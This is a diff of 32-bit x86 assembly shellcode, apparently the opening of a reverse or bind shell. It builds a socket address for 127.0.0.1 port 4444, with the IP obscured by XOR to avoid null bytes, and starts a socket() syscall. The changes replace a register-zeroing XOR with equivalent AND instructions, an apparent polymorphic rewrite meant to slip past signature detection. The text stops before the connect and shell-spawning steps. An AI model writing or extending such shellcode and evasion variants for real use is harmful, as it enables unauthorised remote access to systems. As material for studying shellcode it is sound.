@@ -1,3 +1,4 @@
+BITS 32
 global _start
 
 section .text
@@ -8,20 +9,22 @@ section .text
     ; clear required registers
     ;xor   eax, eax
     ;xor   ecx, ecx
-    xor   edx, edx
+    ;sub edx, edx
+    and edx, 0x01010101
+    and edx, 0x02020202
 
     ; create sockaddr_in struct
     push  eax
     push  eax             ; [$esp]: 8 bytes of padding
     mov   eax, 0xffffffff
-    xor eax, 0xfeffff80
+    xor  eax,  0xfeffff80
     push eax
     push  word 0x5c11     ; [$esp]: 4444
     push  word 0x02       ; [$esp]: AF_INET
 
     ; call socket(domain, type, protocol)
     xor   eax, eax
-    xor   ebx, ebx
+ xor   ebx, ebx
     mov   ax, 0x167       ; $eax: 0x167 / 359
     mov   bl, 0x02        ; $ebx: AF_INET
     mov   cl, 0x01        ; $ecx: SOCK_STREAM
